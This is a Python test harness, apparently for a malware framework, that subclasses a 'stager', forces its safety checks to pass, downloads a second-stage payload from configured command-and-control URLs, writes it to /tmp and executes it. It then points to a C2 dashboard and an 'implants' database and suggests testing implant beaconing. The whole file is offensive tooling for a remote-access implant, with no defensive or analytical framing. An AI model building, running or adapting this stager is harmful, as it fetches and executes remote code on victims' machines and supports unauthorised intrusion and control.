#!/usr/bin/env python3
"""
Test-mode stager - bypasses safety checks for development/testing
"""

import os
import sys

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import the original stager
from stager import *

# Monkey-patch the safety checks
class TestStager(_S):
    def _run_checks(self) -> bool:
        """Bypass all safety checks for testing"""
        print("[TEST MODE] Safety checks bypassed")
        return True
    
    def run(self) -> bool:
        """Run with debug output"""
        print(f"=== TEST MODE STAGER ===")
        print(f"Platform: {platform.system()} {ARCH}")
        print(f"C2 URLs: {[url[:30] + '...' for url in self.cfg['c2_urls']]}")
        
        ok, stage2 = self.download_stage2()
        if not ok:
            print("❌ Stage2 download failed")
            return False
        
        print(f"✅ Stage2 downloaded: {len(stage2)} bytes")
        
        # Save stage2 for inspection
        with open("/tmp/stage2_test.py", "wb") as f:
            f.write(stage2)
        print(f"✅ Stage2 saved to /tmp/stage2_test.py")
        
        # Try to execute
        if self._exec_py(stage2):
            print("✅ Stage2 executed successfully")
            # Don't self-destruct in test mode
            return True
        
        print("❌ Stage2 execution failed")
        return False

def main():
    """Test mode entry point"""
    debug = os.environ.get('ROGUE_DEBUG', '').lower() in ('1', 'true', 'yes')
    s = TestStager(debug=debug)
    
    try:
        success = s.run()
        if success:
            print("\n🎉 TEST COMPLETE - SYSTEM OPERATIONAL")
            print("\nNext steps:")
            print("1. Check C2 dashboard: http://localhost:4444/phase1/dashboard")
            print("2. Check database for new implant: sqlite3 implants.db 'SELECT * FROM implants;'")
            print("3. Test implant beaconing")
        else:
            print("\n⚠️ TEST FAILED - Check logs above")
        
        return 0 if success else 1
        
    except KeyboardInterrupt:
        print("\n⏹️ Test interrupted")
        return 130
    except Exception as e:
        print(f"\n❌ Unhandled exception: {e}")
        import traceback
        traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())